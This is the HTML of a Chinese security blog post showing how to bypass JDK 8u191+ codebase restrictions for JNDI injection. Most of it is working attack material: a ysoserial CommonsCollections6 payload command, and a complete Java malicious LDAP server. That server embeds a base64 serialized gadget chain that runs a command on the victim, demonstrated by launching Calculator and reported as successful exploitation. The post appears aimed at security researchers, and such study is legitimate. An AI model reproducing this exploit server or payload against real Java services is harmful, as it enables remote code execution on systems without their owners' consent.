@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, Hacker, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="Ka's Blog" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          $(e).before("<button class=\"copy button\">复制</button>");
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              // nextElementSibling is figure,highlight.
+              // And following is the sequence of Hexo's internal
+              // highlight layout with line number.
+              return trigger.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          $(e).parent().before("<button class=\"copy button\">复制</button>");
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              // nextElementSibling is figure,highlight.
+              // And following is the sequence of Hexo's internal
+              // highlight layout without line number.
+              return trigger.nextElementSibling.firstChild;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "已复制";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "复制";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>绕过高版本JDK限制进行JNDI注入 | Ka's Blog</title>
+  </head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">Ka's Blog</a></h1>
+        <h2 class="subtitle"></h2>
+      </div>
+      
+      <div class="logo">
+        <img src="/images/logo.png" alt="logo">
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/"><i class="fas fa-home"></i><span class="menu-text">首页</span></a></li>
+        
+        <li role="menuitem"><a href="/archives/"><i class="fas fa-archive"></i><span class="menu-text">归档</span></a></li>
+        
+        <li role="menuitem"><a href="/about/"><i class="fas fa-archive"></i><span class="menu-text">关于</span></a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://www.3cac.com/2019/08/02/绕过高版本JDK限制进行JNDI注入/">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Ka">
+       <meta itemprop="description" content>
+       <meta itemprop="image" content="/images/ava.png">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="Ka's Blog">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">绕过高版本JDK限制进行JNDI注入</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-08-02T09:11:41+08:00">2019-08-02 09:11:41</time></span>
+        </span>
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <h2 id="0X01-测试环境"><a href="#0X01-测试环境" class="headerlink" title="0X01 测试环境"></a>0X01 测试环境</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">macOs 10.14.6</span><br><span class="line">java version <span class="string">"1.8.0_221"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-JDK-8u191-高版本的限制"><a href="#0x02-JDK-8u191-高版本的限制" class="headerlink" title="0x02 JDK 8u191+高版本的限制"></a>0x02 JDK 8u191+高版本的限制</h2><p>jdk 1.8.0_211 的loadClass(String className, String codebase) 如果trustURLCodebase为false的话, 直接返回null, 不再从远程代码库中动态加载字节码。并且trustURLCodebase已经默认为false, 所以不能够再使用这种方法。</p>
+<figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"true"</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line">        ClassLoader parent = getContextClassLoader();</span><br><span class="line">        ClassLoader cl =</span><br><span class="line">                URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-使用ysoserial生成payload"><a href="#0x03-使用ysoserial生成payload" class="headerlink" title="0x03 使用ysoserial生成payload"></a>0x03 使用ysoserial生成payload</h2><p>首先使用yso生成反序列化数据，可以触发本地Gadget。</p>
+<figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span>.6-SNAPSHOT-all.jar CommonsCollections6 <span class="string">'/Applications/Calculator.app/Contents/MacOS/Calculator'</span>|base64</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-启动ldap-server"><a href="#0x04-启动ldap-server" class="headerlink" title="0x04 启动ldap server"></a>0x04 启动ldap server</h2><p>这里网上找了一个根据marshalling改的server代码，利用LDAP返回序列化数据，触发本地Gadget</p>
+<figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HackerLDAPRefServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lanuchLDAPServer</span><span class="params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    ldap_port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(<span class="string">"http://"</span>+http_server+<span class="string">":"</span>+http_port+<span class="string">"/#Exploit"</span>)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + ldap_port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">"javaSerializedData"</span>,Base64.decode(<span class="string">"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ADYvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA=="</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"HttpServerAddress: "</span>+args[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(<span class="string">"HttpServerPort: "</span>+args[<span class="number">1</span>]);</span><br><span class="line">        System.out.println(<span class="string">"LDAPServerPort: "</span>+args[<span class="number">2</span>]);</span><br><span class="line">        String http_server_ip = args[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> ldap_port = Integer.valueOf(args[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">int</span> http_server_port = Integer.valueOf(args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);</span><br><span class="line">        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.3cac.com/images/20190820/1.png" alt="aa"></p>
+<h2 id="0x05-利用成功"><a href="#0x05-利用成功" class="headerlink" title="0x05 利用成功"></a>0x05 利用成功</h2><p><img src="https://www.3cac.com/images/20190820/2.png" alt="aa"></p>
+
+    </main>
+    <footer class="post-footer">
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/2019/01/02/漏洞危害与修复建议/" rel="next" title="漏洞危害与修复建议"><i class="fas fa-angle-left"></i><span class="nav-title">漏洞危害与修复建议</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+    </div>
+  </nav>
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/ava.png" alt="Ka">
+  
+  <h1 class="author-name">Ka</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+    
+    
+    
+    <div class="archives-count count-block">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">5</a></div>
+    </div>
+    
+    
+    
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0X01-测试环境"><span class="toc-text">0X01 测试环境</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0x02-JDK-8u191-高版本的限制"><span class="toc-text">0x02 JDK 8u191+高版本的限制</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0x03-使用ysoserial生成payload"><span class="toc-text">0x03 使用ysoserial生成payload</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0x04-启动ldap-server"><span class="toc-text">0x04 启动ldap server</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0x05-利用成功"><span class="toc-text">0x05 利用成功</span></a></li></ol></div>
+    </div>
+    
+    
+    
+    <hr>
+    <div class="social-link sidebar-item">
+      <div><i class="far fa-address-card"></i>社交链接<p></p></div>
+      <ul>
+        
+        <li><a href="https://github.com/" target="_blank">GitHub</a></li>
+        
+        <li><a href="https://weibo.com/" target="_blank">Weibo</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>友情链接</div>
+      <ul>
+        
+        <li><a href="https://lazydog.me/" target="_blank">lazydog</a></li>
+        
+        <li><a href="http://g4ba.xyz:1337/" target="_blank">gaba</a></li>
+        
+        <li><a href="http://www.cnblogs.com/icez/" target="_blank">星光</a></li>
+        
+        <li><a href="http://bt7k.com/" target="_blank">BT</a></li>
+        
+        <li><a href="http://www.jianfensec.com/" target="_blank">jianfen</a></li>
+        
+        <li><a href="http://blog.he4rt.me/" target="_blank">he4rt</a></li>
+        
+        <li><a href="https://www.hedysx.com/" target="_blank">Hedysx</a></li>
+        
+        <li><a href="https://www.antergone.com" target="_blank">Antergone</a></li>
+        
+        <li><a href="https://www.espandy.com/" target="_blank">SevenNinghtS</a></li>
+        
+        <li><a href="http://www.mixiyihao.com/" target="_blank">怀萍</a></li>
+        
+        <li><a href="https://www.untnt.com/" target="_blank">TNT</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Ka</span><span class="year"><i class="far fa-copyright"></i>2019</span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          Ka<script>var _hmt = _hmt || [];(function() {  var hm = document.createElement("script");  hm.src = "https://hm.baidu.com/hm.js?2aab18fa50214a86cd79e7e02b671a56";  var s = document.getElementsByTagName("script")[0];   s.parentNode.insertBefore(hm, s);})();</script>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
